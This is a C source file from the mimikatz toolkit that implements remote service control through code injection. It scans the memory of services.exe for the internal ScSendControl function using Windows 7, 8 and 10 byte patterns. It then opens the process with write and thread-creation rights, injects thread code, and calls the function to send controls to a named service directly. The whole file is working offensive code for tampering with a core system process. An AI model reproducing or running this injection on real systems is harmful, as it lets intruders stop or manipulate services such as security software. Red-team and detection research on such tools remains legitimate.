/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_service_remote.h"
#if defined(SERVICE_INCONTROL)

PVOID pScSendControl = NULL;

#if defined(_M_X64)
BYTE PTRN_WN61_ScSendControl[]		= {0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x33, 0xc0};
BYTE PTRN_WIN8_ScSendControl[]		= {0x48, 0x8d, 0x6c, 0x24, 0xf9, 0x48, 0x81, 0xec, 0xd0, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x33, 0xc0};
BYTE PTRN_WI10_ScSendControl[]		= {0x48, 0x8d, 0x6c, 0x24, 0xf9, 0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33, 0xf6};
KULL_M_PATCH_GENERIC ScSendControlReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_ScSendControl),	PTRN_WN61_ScSendControl},	{0, NULL}, {-26}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_ScSendControl),	PTRN_WIN8_ScSendControl},	{0, NULL}, {-21}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI10_ScSendControl),	PTRN_WI10_ScSendControl},	{0, NULL}, {-21}},
};
#elif defined(_M_IX86)
BYTE PTRN_WN61_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x94, 0x00, 0x00, 0x00, 0x53};
BYTE PTRN_WIN8_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x83, 0xec, 0x7c};
BYTE PTRN_WI10_ScSendControl[]		= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x83, 0xec, 0x7c, 0x53, 0x56, 0x57, 0x89};

KULL_M_PATCH_GENERIC ScSendControlReferences[] = {
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_ScSendControl),	PTRN_WN61_ScSendControl},	{0, NULL}, {0}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_ScSendControl),	PTRN_WIN8_ScSendControl},	{0, NULL}, {0}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI10_ScSendControl),	PTRN_WI10_ScSendControl},	{0, NULL}, {0}},
};
#endif

#pragma optimize("", off)
DWORD WINAPI kuhl_service_sendcontrol_std_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = ((PSCSENDCONTROL_STD) lpParameter->input.inputVoid)((LPCWSTR) lpParameter->input.inputData, 0, 0, 0, lpParameter->input.inputDword, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	return STATUS_SUCCESS;
}
DWORD kuhl_service_sendcontrol_std_thread_end(){return 'svcs';}

DWORD WINAPI kuhl_service_sendcontrol_fast_thread(PREMOTE_LIB_DATA lpParameter)
{
	lpParameter->output.outputStatus = ((PSCSENDCONTROL_FAST) lpParameter->input.inputVoid)((LPCWSTR) lpParameter->input.inputData, 0, 0, 0, lpParameter->input.inputDword, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	return STATUS_SUCCESS;
}
DWORD kuhl_service_sendcontrol_fast_thread_end(){return 'svcf';}
#pragma optimize("", on)

BOOL kuhl_service_sendcontrol_inprocess(PWSTR ServiceName, DWORD dwControl)
{
	BOOL status = FALSE;
	DWORD processId, szCode;
	PVOID pCode;
	HANDLE hProcess;
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	PKULL_M_PATCH_GENERIC currentReference;
	PEB Peb;
	PIMAGE_NT_HEADERS pNtHeaders;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	if(kull_m_process_getProcessIdForName(L"services.exe", &processId))
	{
		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, processId))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory))
			{
				if(!pScSendControl)
				{
					if(kull_m_process_peb(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory, &Peb, FALSE))
					{
						sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = Peb.ImageBaseAddress;
						if(kull_m_process_ntheaders(&sMemory.kull_m_memoryRange.kull_m_memoryAdress, &pNtHeaders))
						{
							sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
							sMemory.kull_m_memoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;
							if(currentReference = kull_m_patch_getGenericFromBuild(ScSendControlReferences, ARRAYSIZE(ScSendControlReferences), MIMIKATZ_NT_BUILD_NUMBER))
							{
								aLocalMemory.address = currentReference->Search.Pattern;
								if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
									pScSendControl = (PBYTE) sMemory.result + currentReference->Offsets.off0;
								else PRINT_ERROR_AUTO(L"kull_m_memory_search");
							}
							LocalFree(pNtHeaders);
						}
					}
				}

				if(pScSendControl)
				{
					if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8)
					{
						szCode = (DWORD) ((PBYTE) kuhl_service_sendcontrol_std_thread_end - (PBYTE) kuhl_service_sendcontrol_std_thread);
						pCode = kuhl_service_sendcontrol_std_thread;
					}
					else
					{
						szCode = (DWORD) ((PBYTE) kuhl_service_sendcontrol_fast_thread_end - (PBYTE) kuhl_service_sendcontrol_fast_thread);
						pCode = kuhl_service_sendcontrol_fast_thread;
					}
					
					if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory, pCode, szCode, NULL, &aRemoteFunc))
					{
						if(iData = kull_m_remotelib_CreateInput(pScSendControl, dwControl, (DWORD) (wcslen(ServiceName) + 1) * sizeof(wchar_t), ServiceName))
						{
							if(kull_m_remotelib_create(&aRemoteFunc, iData, &oData))
							{
								if(oData.outputStatus)
									kprintf(L"error %u\n", oData.outputStatus);
								else
									kprintf(L"OK!\n");
							}
							else PRINT_ERROR_AUTO(L"kull_m_remotelib_create");
							LocalFree(iData);
						}
						kull_m_memory_free(&aRemoteFunc, 0);
					}
					else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
				}
				else PRINT_ERROR(L"Not available without ScSendControl\n");
				kull_m_memory_close(sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory);
			}
			CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	return status;
}
#endif